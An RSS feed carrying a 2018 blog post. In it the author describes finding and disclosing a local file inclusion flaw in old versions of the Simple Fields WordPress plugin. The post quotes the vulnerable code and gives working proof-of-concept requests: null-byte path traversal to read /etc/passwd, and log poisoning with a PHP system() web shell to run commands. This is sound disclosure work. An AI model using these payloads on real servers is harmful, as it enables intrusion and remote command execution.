<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>exploit-db &#8211; Graeme Robinson&#039;s blog</title>
	<atom:link href="/blog/category/exploit/exploit-db/feed/" rel="self" type="application/rss+xml" />
	<link>/blog/</link>
	<description>A place for my thoughts when I was starting to break into the information security feild</description>
	<lastBuildDate>Sun, 29 Apr 2018 11:12:59 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.6.2</generator>
	<item>
		<title>I discovered a vulnerability in a wordpress plugin</title>
		<link>/blog/i-discovered-a-vulnerability-in-a-wordpress-plugin/</link>
					<comments>/blog/i-discovered-a-vulnerability-in-a-wordpress-plugin/#respond</comments>
		
		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
		<pubDate>Sun, 29 Apr 2018 11:12:59 +0000</pubDate>
				<category><![CDATA[Exploit]]></category>
		<category><![CDATA[exploit-db]]></category>
		<category><![CDATA[Web Server]]></category>
		<guid isPermaLink="false">/blog/?p=333</guid>

					<description><![CDATA[I was reviewing some code recently that had been written by someone that I knew and I found an LFI vulnerability using directory traversal. I explained it to them and they fixed it, but not quite well enough, so I &#8230; <a href="/blog/i-discovered-a-vulnerability-in-a-wordpress-plugin/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
										<content:encoded><![CDATA[<p>I was reviewing some code recently that had been written by someone that I knew and I found an LFI vulnerability using directory traversal. I explained it to them and they fixed it, but not quite well enough, so I showed them again how it could be exploited in a different way, and this time the fixed it properly. Hopefully they learnt a lesson on the way that they should always sanitise user input.</p>
<p>It was thrilling to discover an exploit like this myself so I decided to search public code repositories for obviously vulnerable lines of code. I found a wordpress plugin called simple fields that had a LFI vulnerability in due to unsanitised user input. It can even lead to RFI or RCE depending on how the web server is configured (e.g. allow_url_include is enabled or of apache logs can be poisoned and loaded). It actually looks like it was fixed in later versions because the lines containing the vulnerability were commented out, but old versions my still be installed on some sites.</p>
<p>I submitted the vulnerability to the exploit database and <a href="https://www.exploit-db.com/exploits/44425/">it has been published here</a>.</p>
<p>I knew how the vulnerability should work, but I needed to verify it, so I had to set up an environment to test it. The vulnerability requires version 0.2 &#8211; 0.3.5 of simple fields and it must be hosted on a system running 5.3.3 or older php. It&#8217;s pretty hard to install 5.3.3 or older php these days. There won&#8217;t be a php package of that version in any default repositories. The easiest way I found of installing it was to install camp 1.7.2 on Linux (I used Ubuntu 16.0.4)</p>
<p>PHP &lt;5.3.4 is required because the exploit relies on the ability to inject a null byte to terminate a string before the script expects it to be and this was fixed in PHP 5.3.4</p>
<p>The vulnerable line of code in simple_fields.php is:</p>
<pre>require( $_GET["wp_abspath"] . './wp-blog-header.php' );</pre>
<h1>Proof of concept LFI:</h1>
<pre>http://host/wordpress/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00</pre>
<p>This works because the null byte terminates the string, so the trailing &#8220;./wp-blog-header.php&#8221; is ignored.</p>
<h1>Proof of concept RCE:</h1>
<pre>$ echo "&lt;?system(\$_GET['cmd'])?&gt;"|nc host 80
$ curl "http://host/wordpress/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=../../../../../logs/access_log%00&amp;cmd=id"</pre>
<p>This works because we first poison the apache logs with some php that will run whatever command was submitted as the value for &#8220;cmd&#8221; in the query string, and then we use the LFI to include the poisoned log and the command we want to run.</p>
<p>This vulnerability is admittedly not that likely to show up in the wild since it requires an old version of php, and an old version of a plugin that isn&#8217;t even supported any more, but it could be present on some old systems.</p>
]]></content:encoded>
					
					<wfw:commentRss>/blog/i-discovered-a-vulnerability-in-a-wordpress-plugin/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
